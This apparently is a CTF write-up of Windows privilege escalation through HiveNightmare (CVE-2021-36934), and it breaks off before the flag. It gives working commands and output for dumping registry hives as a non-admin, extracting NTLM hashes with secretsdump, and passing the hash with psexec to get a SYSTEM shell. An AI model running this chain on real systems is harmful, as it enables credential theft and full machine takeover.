# CTF Writeup: Windows Privilege Escalation via HiveNightmare (CVE-2021-36934)

This writeup details the privilege escalation phase of a Windows target, moving from a low-privilege shell as the user `sammy` to full `nt authority\system` access by exploiting a well-known vulnerability in Windows shadow copy permissions (HiveNightmare / SeriousSAM).

---

## 1. Initial Enumeration

After establishing a foothold on the target machine as the low-privilege user `sammy`, the first step was to enumerate the system for local privilege escalation vectors. To automate this, we ran the PowerShell enumeration script **PrivescCheck**.

```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

```

The script generated a summary of potential vulnerabilities categorized by tactics. While several low-risk items popped up, a critical indicator stood out under **Credential Access**:

```text
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃                  ~~~ PrivescCheck Summary ~~~                ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
  TA0001 - Initial Access
  - Network - Network Selection From Lock Screen → Low
  ...
  TA0004 - Privilege Escalation
  - Services - Registry Permissions (Extended) → Medium
  - Updates - Update History → Medium
  TA0006 - Credential Access
  - Credentials - Hive File Permissions → Medium

```

The finding **"Credentials - Hive File Permissions"** is a highly exploitable misconfiguration. It suggests that the Access Control Lists (ACLs) on the system’s registry hive files—specifically the SAM, SYSTEM, and SECURITY hives—are misconfigured, allowing non-administrative users to read them.

---

## 2. Vulnerability Analysis: HiveNightmare (CVE-2021-36934)

In default Windows 10 and 11 installations prior to the July 2021 security updates, the directory permissions for `C:\Windows\System32\config` allowed members of the `BUILTIN\Users` group read access to the registry hives.

While active registry hives are locked by the operating system during runtime, Windows routinely creates system backups via the **Volume Shadow Copy Service (VSS)**. Because these backup files inherit the overly permissive ACLs, any local user can read them directly from the shadow copies.

This vulnerability, tracked as **CVE-2021-36934** (colloquially named **HiveNightmare** or **SeriousSAM**), allows a low-privilege user to extract the local Administrator's NTLM password hash without needing administrative privileges.

---

## 3. Exploitation & Hive Extraction

To exploit this, we used a compiled C# exploit executable (`HiveNightmare.exe`) designed to locate the Volume Shadow Copies and automatically extract the `SAM`, `SYSTEM`, and `SECURITY` hives to our current working directory.

Running the exploit from our user directory:

```cmd
PS C:\Users\Sammy\Downloads> .\HiveNightmare.exe

```

### Exploit Execution Output:

```text
 HiveNightmare v0.6 - dump registry hives as non-admin users

 Specify maximum number of shadows to inspect with parameter if wanted, default is 15.

 Running...

 Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM

 Success: SAM hive from 2025-01-15 written out to current working directory as SAM-2025-01-15

 Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SECURITY

 Success: SECURITY hive from 2025-01-15 written out to current working directory as SECURITY-2025-01-15

 Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SYSTEM

 Success: SYSTEM hive from 2025-01-15 written out to current working directory as SYSTEM-2025-01-15

 Assuming no errors above, you should be able to find hive dump files in current working directory.

```

Listing the directory contents confirmed that we successfully acquired local copies of the registry hives:

```powershell
PS C:\Users\Sammy\Downloads> ls

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/14/2026  10:44 AM         227328 HiveNightmare.exe
-a----        7/14/2026  10:44 AM          65536 SAM-2025-01-15
-a----        7/14/2026  10:44 AM          32768 SECURITY-2025-01-15
-a----        7/14/2026  10:44 AM       12320768 SYSTEM-2025-01-15

```

---

## 4. Hash Extraction

After transferring the dumped hives to our Kali Linux environment, we used Impacket's `secretsdump.py` tool to parse the offline registry files and dump the local machine's security account manager database.

```bash
secretsdump.py -sam SAM-2025-01-15 -system SYSTEM-2025-01-15 LOCAL

```

### Resulting Output:

```text
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootkey: 0x8f2d5e3cb7e1b402a11b8163f9ef028c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:93cd9672e50a6d53446b71408ae418e9:::
Sammy:1000:aad3b435b51404eeaad3b435b51404ee:205d4472747b814ffb23cfa969a77ad8:::
SuperAdministrator:1001:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
[*] Cleaning up...

```

We isolated the local Administrator account's NTLM hash:

`13b29964cc2480b4ef454c59562e675c`

---

## 5. Administrative Privilege Escalation

Instead of attempting to crack the hash offline using a wordlist like `rockyou.txt`, we can authenticate directly via a **Pass-the-Hash (PtH)** attack using Impacket's `psexec.py` or `wmiexec.py`.

From our Kali machine, we targeted the Windows machine's IP address:

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c Administrator@10.10.10.150

```

### Establishing the Shell:

```text
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.150.....
[*] Found writable share ADMIN$
[*] Uploading file DAnXwOpl.exe
[*] Opening SVCManager on 10.10.10.150.....
[*] Creating service vUuL on 10.10.10.150.....
[*] Starting service vUuL.....
[+] Sent command-line; its output follows:
Microsoft Windows [Version 10.0.19042.928]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```

Success! The session was established directly as `nt authority\system`. From here, navigating to the Administrator's Desktop allows us to read the final flag file:

